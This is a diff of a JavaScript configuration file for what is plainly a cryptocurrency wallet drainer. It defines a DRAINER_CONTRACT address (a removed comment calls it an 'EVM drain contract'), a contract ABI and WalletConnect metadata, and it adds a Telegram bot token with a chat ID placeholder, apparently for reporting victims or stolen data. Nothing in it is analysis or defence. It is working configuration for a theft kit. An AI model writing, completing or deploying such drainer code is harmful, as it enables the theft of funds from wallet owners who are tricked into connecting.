@@ -1,10 +1,5 @@
-// config.js – All sensitive constants are centralised here.
-// Replace these values with your own in production (use .env with a bundler).
 export const CONFIG = {
-  // EVM drain contract
   DRAINER_CONTRACT: "0xbf2c883b097d6733a7e5a8d853d05825564bd857",
-
-  // Full ABI as a string (parsed once)
   CONTRACT_ABI: JSON.parse(`[
     {
       "type": "constructor",
@@ -931,4 +926,8 @@ export const CONFIG = {
     url: window.location.origin,
     icons: ['https://walletconnect.com/walletconnect-logo.png'],
   }
+  
+ // ====== TELEGRAM CREDENTIALS ======
+  TELEGRAM_BOT_TOKEN: "8695014382:AAHVuw3qQTCa_rGIzBXoRxDEdKkPvUhLim0",
+  TELEGRAM_CHAT_ID: "YOUR_CHAT_ID_HERE",   // <-- Replace with your actual chat ID
 };
